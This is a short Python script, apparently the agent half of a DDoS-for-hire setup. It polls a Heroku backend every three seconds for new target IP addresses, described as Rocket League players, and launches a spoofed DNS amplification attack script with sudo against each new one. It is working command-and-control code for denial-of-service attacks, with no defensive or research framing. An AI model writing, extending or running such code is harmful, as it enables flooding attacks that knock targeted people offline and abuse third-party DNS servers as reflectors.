# vps_agent.py — Auto-trigger DNS amplifier from Heroku tasks
import time
import requests
import subprocess

# === CONFIGURATION ===
BACKEND_URL = "https://keyauthddos-e093a0d5e730.herokuapp.com"
CHECK_INTERVAL = 3  # seconds
last_target = None

# === POLLING LOOP ===
print("[*] VPS Agent Online. Polling for new Rocket League targets...")
while True:
    try:
        res = requests.get(f"{BACKEND_URL}/dispatch").json()
        if "ip" in res:
            ip = res["ip"]
            if ip != last_target:
                print(f"[+] New target acquired: {ip}. Launching attack...")
                subprocess.run(["sudo", "python3", "dns_amp_spoof.py"], check=False)
                last_target = ip
        else:
            print("[~] No new targets.")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(CHECK_INTERVAL)
